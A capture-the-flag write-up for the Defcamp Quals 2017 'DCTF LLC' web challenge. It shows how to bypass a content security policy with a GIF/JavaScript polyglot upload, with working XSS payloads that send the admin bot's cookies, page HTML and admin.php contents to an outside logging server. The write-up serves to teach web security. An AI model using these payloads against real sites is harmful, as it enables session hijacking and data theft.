## Title: 
Defcamp Quals 2017 CTF DCTF LLC writeup

## Description: 
We are looking for your feedback about our new amazing company! :-) 

## Writeup: 
I was the first to solve this challenge and we got bonus points for this. When we visit the website we see a form asking for name, email, message and file.
The first thing I tried is to upload a php file to get a shell, but that didn't work. Looking at the response header we see: 
```
content-security-policy:default-src 'none'; img-src 'self' *.imgur.com *.ibb.co; script-src 'self'; connect-src 'self'; style-src 'self' fonts.googleapis.com fonts.gstatic.com 'unsafe-inline'; font-src 'self' fonts.gstatic.com  fonts.googleapis.com;
```
Noticing `script-src 'self'`, I immediately realized that this is XSS and we have to bypass CSP by uploading our JS through a valid image with size less than 500 bytes and the image seems to by validated with `getimagesize()`.

The best way to get a valid image with an XSS payload is through GIF images so here is what I tried: 
```javascript
GIF89a/*
  ? ,    /*
   ;*/=1;document.location='https://myserver/log.php?x='+encodeURIComponent(document.cookie+document.getElementsByTagName('html')[0].innerHTML+document.cookie);
```
Now we include the image through a script tag in the message field: `<script src=/__acf23acea0ea2f39205ab707c8ed19d3/x.gif></script>` and here is what I got in the logs file: 
```
IP: 45.76.95.55 - September 30, 2017, 12:41 pm
REFERRER: https://llc.dctf-quals-17.def.camp//bot.php?id=258
Array
(
    [x] => <head>
<script src="jquery.js.min"></script>
</head>
<body>


<a href="admin.php">Dashboard</a>
<div align="center"><h4>Message Sent. Here's the preview:</h4>
	<div>
	Name: test@test
	Email: test@test
	Message: test<script src="/__acf23acea0ea2f39205ab707c8ed19d3/x.gif"></script></div></div></body>
)
```

We didn't get the flag, so it's probably in the `admin.php` file, all we have to do is to get its contents through an ajax request (jquery already loaded). 
```javascript
GIF89a/*
  ? ,    /*
   ;*/=1;$.ajax('/admin.php').done(function(data){location='https://myserver/log.php?x='+encodeURIComponent(data);});
```
and we got the flag: `DCTF{808f50ca3f3182a30e76bb9fcc0fdcb7f75f4ce597f7abe1793e3942acf3ec9e}` 
